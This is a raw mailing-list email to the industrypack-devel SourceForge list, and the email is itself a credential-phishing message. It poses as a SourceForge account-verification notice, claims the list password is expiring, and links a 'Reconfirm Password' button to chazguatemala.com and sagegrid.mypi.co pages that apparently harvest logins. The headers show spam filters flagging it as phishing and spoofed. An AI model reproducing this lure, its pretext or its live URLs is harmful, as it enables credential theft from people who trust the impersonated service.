Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id AAB03B1C166
	for <lists+industrypack-devel@lfdr.de>; Wed,  6 Aug 2025 09:39:05 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
	MIME-Version:Message-ID:Date:To:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=P2v6BcYppwptVofqCKdxkBcNrTZ0Dv+m33SDbxAGqOM=; b=L12dCGIxpjX74Fs+UAFNTmw2vL
	Gr54pRRaIGh3wMAdRfoNjiu8c0quATQ2J8IrN8EvmxPKxPPdLaWlKitJmiKLYrx7iekv+4BROiU/Z
	5/AkmUY3K2aIdWJqCRSkL2fmaVV7bhjqC+fBp6FSjU8XDFOsamOBm8TuJUPIl4TfKxtQ=;
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1ujYjn-0007PI-Ou
	for lists+industrypack-devel@lfdr.de;
	Wed, 06 Aug 2025 07:39:04 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <ricardo.araujo0330@icloud.com>) id 1ujYjm-0007P9-Nu
 for industrypack-devel@lists.sourceforge.net;
 Wed, 06 Aug 2025 07:39:03 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=wv5wBMiyrjkub6gzCa/+HauIVDebq1TwHSlNXzEZB7U=; b=j6vEnQ0yYZLj6Rd7VelblQGjYf
 +3awS7831Up4OMVodGwqzzKHdbdq3RsHKUsVr7+eABo15iSM273Rx/tE3LQmJXp69rHazk9qx257F
 lBTK7NmNURzMmGJa20Y+dhifITpKzjaokCgKGNJck5cMiptnSoqoY1UVtCBkrSPnEGJg=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=wv5wBMiyrjkub6gzCa/+HauIVDebq1TwHSlNXzEZB7U=; b=H
 jOIxTkYHQqW04WHpJI8hpkc+EB2Gh91kEOPq3ugDJA8N8d3KRI4+aKADq8coFVCMKnxwg/toeI410
 XhQUWHEu2H5/46+MXpvgXr186o4uLFS7cwhQ3LD1EJtyNpPzMAOsOgo2xn/6TFDuFHJXQfNQXvWKH
 6sk+D4QMm93wNo1w=;
Received: from [188.127.249.143] (helo=rosenbauer.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1ujYjm-0005u7-Au for industrypack-devel@lists.sourceforge.net;
 Wed, 06 Aug 2025 07:39:03 +0000
Received: from icloud.com (localhost [IPv6:::1])
 by rosenbauer.com (Postfix) with ESMTP id 05A73CE2844
 for <industrypack-devel@lists.sourceforge.net>;
 Wed,  6 Aug 2025 08:04:08 +0300 (MSK)
To: industrypack-devel@lists.sourceforge.net
Date: 06 Aug 2025 07:04:08 +0200
Message-ID: <20250806070408.EE94178118B35D5D@icloud.com>
MIME-Version: 1.0
X-Spam-Score: 7.1 (+++++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-1.hosts.colo.sdot.me", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  lists.sourceforge.net | Account verification Your password
 for your email account industrypack-devel@lists.sourceforge.net will expire
 on Wednesday, August 6, 2025 7:4 a.m. To continue using your account, please
 confirm account ownership below to avoid deactivation. 
 Content analysis details:   (7.1 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 FREEMAIL_FROM Sender email is commonly abused enduser mail provider
 [ricardo.araujo0330(at)icloud.com]
 0.2 FREEMAIL_ENVFROM_END_DIGIT Envelope-from freemail username ends in
 digit [ricardo.araujo0330(at)icloud.com]
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.4 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
 0.0 PDS_FRNOM_TODOM_DBL_URL From Name to domain, double URL
 0.0 GOOG_REDIR_HTML_ONLY   Google redirect to obscure spamvertised website
 + HTML only
 0.9 PDS_FRNOM_TODOM_NAKED_TO Naked to From name equals to Domain
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 GOOG_REDIR_NORDNS      Google redirect to obscure spamvertised website +
 no rDNS
 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML only
 0.0 SPOOFED_FREEMAIL       No description available.
 0.0 SPOOFED_FREEMAIL_NO_RDNS From SPOOFED_FREEMAIL and no rDNS
 0.0 URI_PHISH              Phishing using web form
 1.7 RAZOR2_CHECK           Listed in Razor2 (http://razor.sf.net/)
 2.4 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
 [cf: 100]
 0.0 FSL_BULK_SIG           Bulk signature with no Unsubscribe
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1ujYjm-0005u7-Au
Subject: [Industrypack-devel] [SPAM] (industrypack-devel@******) Password
 Error!
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: "lists.sourceforge.net via Industrypack-devel"
 <industrypack-devel@lists.sourceforge.net>
Reply-To: "lists.sourceforge.net" <ricardo.araujo0330@icloud.com>
Content-Type: multipart/mixed; boundary="===============7562179301092616767=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============7562179301092616767==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body style=3D"MARGIN: 0.5em">
<DIV dir=3Dltr>
<DIV dir=3Dltr>
<DIV dir=3Dltr>
<DIV dir=3Dltr>
<DIV dir=3Dltr>
<DIV dir=3Dltr>
<DIV dir=3Dltr>
<DIV dir=3Dltr>
<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Robot=
o,sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: coll=
apse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-ST=
YLE: normal; TEXT-ALIGN: left; PADDING-TOP: 32px; LETTER-SPACING: normal; B=
ACKGROUND-COLOR: rgb(255,255,255); font-variant-ligatures: normal; font-var=
iant-caps: normal; text-decoration-style: initial; text-decoration-color: i=
nitial" cellspacing=3D"0" cellpadding=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box">
<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
ing=3D"0" cellpadding=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; MAX-WIDTH: 560px; BORDER-TOP: rgb(224,=
224,224) 1px solid; BORDER-RIGHT: rgb(224,224,224) 1px solid; BORDER-BOTTOM=
: rgb(224,224,224) 1px solid; PADDING-BOTTOM: 32px; PADDING-TOP: 24px; PADD=
ING-LEFT: 24px; BORDER-LEFT: rgb(224,224,224) 1px solid; PADDING-RIGHT: 24p=
x; BACKGROUND-COLOR: rgb(250,250,250); border-radius: 2px">
<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse; MIN-WIDT=
H: 272px; PADDING-TOP: 8px">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box">
<H2 style=3D"BOX-SIZING: border-box; FONT-SIZE: 20px; FONT-WEIGHT: 700; COL=
OR: rgb(33,33,33); MARGIN: 0px; LINE-HEIGHT: 1.2"><FONT style=3D"BOX-SIZING=
: border-box" face=3D"tahoma, sans-serif">lists.sourceforge.net | Account v=
erification</FONT></H2></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; COLOR: rgb(117,117,11=
7); PADDING-TOP: 20px"><FONT style=3D"BOX-SIZING: border-box" face=3D"tahom=
a, sans-serif">Your password for your email account industrypack-devel@list=
s.sourceforge.net will&nbsp;expire on<SPAN> </SPAN></FONT> Wednesday, Augus=
t 6, 2025 7:4 a.m.<BR style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-S=
IZING: border-box" face=3D"tahoma, sans-serif"><BR style=3D"BOX-SIZING: bor=
der-box">
To continue using your account, please confirm account ownership below to a=
void deactivation.<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZ=
ING: border-box"><FONT style=3D"BOX-SIZING: border-box" size=3D2>
<table style=3D"BOX-SIZING: border-box; MAX-WIDTH: 100%; BORDER-COLLAPSE: c=
ollapse; BORDER-SPACING: 0px; BACKGROUND-COLOR: transparent" cellspacing=3D=
"0" cellpadding=3D"0" align=3D"left" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 18px; FONT-WEIGHT: bold; LI=
NE-HEIGHT: 22px" align=3D"left">
<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; BORDER-TOP: rgb(=
25,118,210) 10px solid; BORDER-RIGHT: rgb(25,118,210) 20px solid; BORDER-BO=
TTOM: rgb(25,118,210) 10px solid; COLOR: rgb(255,255,255); OUTLINE-WIDTH: 0=
px; OUTLINE-STYLE: none; BORDER-LEFT: rgb(25,118,210) 20px solid; DISPLAY: =
inline-block; BACKGROUND-COLOR: rgb(25,118,210); border-radius: 3px" href=
=3D"https://chazguatemala.com/contact/Webmail.html?eta=3Dindustrypack-devel=
@lists.sourceforge.net" rel=3Dnoreferrer target=3D_blank=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://sagegrid.myp=
i.co/account/wmail.html?userid%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp=
;ust=3D1754370881542000&amp;usg=3DAOvVaw0Es5v76ZY6lKcA9DolDJjk">Reconfirm P=
assword</A></TD></TR></TBODY></TABLE></FONT><BR style=3D"BOX-SIZING: border=
-box"><BR style=3D"BOX-SIZING: border-box"><B style=3D"BOX-SIZING: border-b=
ox; FONT-WEIGHT: bolder"><BR style=3D"BOX-SIZING: border-box">lists.sourcef=
orge.net |<SPAN> </SPAN></B>
Team<SPAN style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bold; COLOR: rgb(0,=
0,0)"><BR style=3D"BOX-SIZING: border-box"></SPAN></FONT></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-WEIGHT: bold; CO=
LOR: rgb(66,133,244); PADDING-TOP: 24px">
<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR: rgb(0,172=
,255); BACKGROUND-COLOR: transparent" href=3D"https://chazguatemala.com/con=
tact/Webmail.html?eta=3Dindustrypack-devel@lists.sourceforge.net" rel=3Dnor=
eferrer target=3D_blank data-saferedirecturl=3D"https://www.google.com/url?=
q=3Dhttps://sagegrid.mypi.co/account/wmail.html?userid%3D%5B%5B-Email-%5D%5=
D&amp;source=3Dgmail&amp;ust=3D1754370881542000&amp;usg=3DAOvVaw0Es5v76ZY6l=
KcA9DolDJjk"><FONT style=3D"BOX-SIZING: border-box" face=3D"tahoma, sans-se=
rif">LEARN MORE</FONT></A>
 </TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
<TR style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; WIDTH: 462px">
<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 48px; PADDING-TOP: 48p=
x; PADDING-LEFT: 10px; PADDING-RIGHT: 10px" align=3D"left"><FONT style=3D"B=
OX-SIZING: border-box" face=3D"tahoma, sans-serif">This message cannot be r=
eplied</FONT></TD></TR></TBODY></TABLE></DIV></DIV></DIV></DIV></DIV></DIV>=
</DIV></DIV></BODY></HTML>


--===============7562179301092616767==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============7562179301092616767==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============7562179301092616767==--
